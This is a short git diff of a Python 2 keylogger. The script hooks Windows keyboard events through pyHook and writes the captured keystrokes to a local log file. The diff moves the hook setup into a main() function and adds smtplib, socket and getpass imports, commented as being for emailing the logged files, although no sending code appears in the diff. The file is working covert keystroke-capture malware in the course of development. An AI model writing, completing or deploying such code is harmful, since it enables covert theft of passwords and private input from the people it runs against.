@@ -1,12 +1,14 @@
-#! python2
+#! python2 
+# Python keylogger (run with python2)
 
-# Python keylogger
-
-import pythoncom
-import pyHook
 import sys
 import logging
 import time
+
+# Modules for keylogging
+import pythoncom, pyHook
+# Modules for emailing logged files
+import smtplib, socket, getpass
 
 log = "" 
 logdir = "loggedfiles\log.txt"
@@ -22,14 +24,6 @@ def OnKeyboardEvent(event):
 		elif event.Ascii == 8:
 			log = "[Backspace]"
 			
-		''' Original ctrl-o to exit
-		elif event.Ascii == 15:
-			openfile.close()
-			sys.exit()
-		'''	
-		
-		# Test custom exit
-		# ctrl+q to exit
 		elif event.Ascii == 17:
 			openfile.close()
 			sys.exit()
@@ -45,10 +39,13 @@ def OnKeyboardEvent(event):
 		
 	except:
 		pass
+def main():	
+	hm = pyHook.HookManager()
+	hm.KeyDown = OnKeyboardEvent
+	hm.HookKeyboard()
 	
-hm = pyHook.HookManager()
-hm.KeyDown = OnKeyboardEvent
-hm.HookKeyboard()
-
-while True:
-	pythoncom.PumpMessages()
+	while True:
+		pythoncom.PumpMessages()
+		
+main()
+	
